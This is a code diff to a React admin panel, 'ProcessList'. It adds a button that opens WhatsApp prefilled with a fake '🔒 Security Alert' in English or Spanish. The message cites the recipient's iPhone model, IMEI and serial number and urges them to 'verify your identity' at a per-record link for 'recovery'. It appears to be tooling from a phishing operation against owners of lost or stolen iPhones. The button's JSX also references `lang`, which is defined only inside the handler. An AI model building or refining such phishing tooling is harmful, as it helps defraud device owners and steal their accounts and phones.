@@ -256,6 +256,41 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     loadProcesses();
   };
 
+  const handleOpenWhatsAppDirect = (process: Process) => {
+    const lang = getLanguageFromCountryCode(process.country_code);
+    const isMobile = window.innerWidth < 768 || /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const fullPhone = `${process.country_code}${process.phone_number}`.replace(/\+/g, '');
+
+    const message = lang === 'english'
+      ? `🔒 Security Alert
+
+Device detected online.
+
+📱 ${process.iphone_model} - ${process.color} - ${process.storage}
+IMEI: ${process.imei}
+Serial: ${process.serial_number}
+
+Verify your identity at the following link to proceed with recovery.
+${process.url || ''}`
+      : `🔒 Alerta de Seguridad
+
+Dispositivo detectado en línea.
+
+📱 ${process.iphone_model} - ${process.color} - ${process.storage}
+IMEI: ${process.imei}
+Serie: ${process.serial_number}
+
+Verifique su identidad en el siguiente enlace para proceder con la recuperación.
+${process.url || ''}`;
+
+    const encoded = encodeURIComponent(message.trim());
+    const baseUrl = isMobile
+      ? 'https://api.whatsapp.com/send'
+      : 'https://web.whatsapp.com/send';
+    
+    window.open(`${baseUrl}?phone=${fullPhone}&text=${encoded}`, '_blank');
+  };
+
   const handleSendViaWebJs = async (process: Process) => {
     try {
       setSendingMessage(process.id);
@@ -800,15 +835,25 @@ ${random(closings)}`;
                         WAPRO
                       </Button>
                       {userType === 'admin' && (
-                        <Button
-                          size="sm"
-                          onClick={() => handleSendViaWebJs(process)}
-                          disabled={sendingMessage === process.id}
-                          className="bg-violet-500/15 hover:bg-violet-500/25 text-violet-400 border border-violet-500/20 h-8 text-xs gap-1.5"
-                        >
-                          <Send className="h-3.5 w-3.5" />
-                          WA Web
-                        </Button>
+                        <>
+                          <Button
+                            size="sm"
+                            onClick={() => handleSendViaWebJs(process)}
+                            disabled={sendingMessage === process.id}
+                            className="bg-violet-500/15 hover:bg-violet-500/25 text-violet-400 border border-violet-500/20 h-8 text-xs gap-1.5"
+                          >
+                            <Send className="h-3.5 w-3.5" />
+                            WA Web
+                          </Button>
+                          <Button
+                            size="sm"
+                            onClick={() => handleOpenWhatsAppDirect(process)}
+                            className="bg-emerald-700/20 hover:bg-emerald-700/30 text-emerald-400 border border-emerald-600/25 h-8 text-xs gap-1.5"
+                          >
+                            <MessageSquare className="h-3.5 w-3.5" />
+                            WA Dir {lang === 'english' ? '🇺🇸' : '🇪🇸'}
+                          </Button>
+                        </>
                       )}
                       <div className="flex gap-1.5 ml-1">
                         <Button
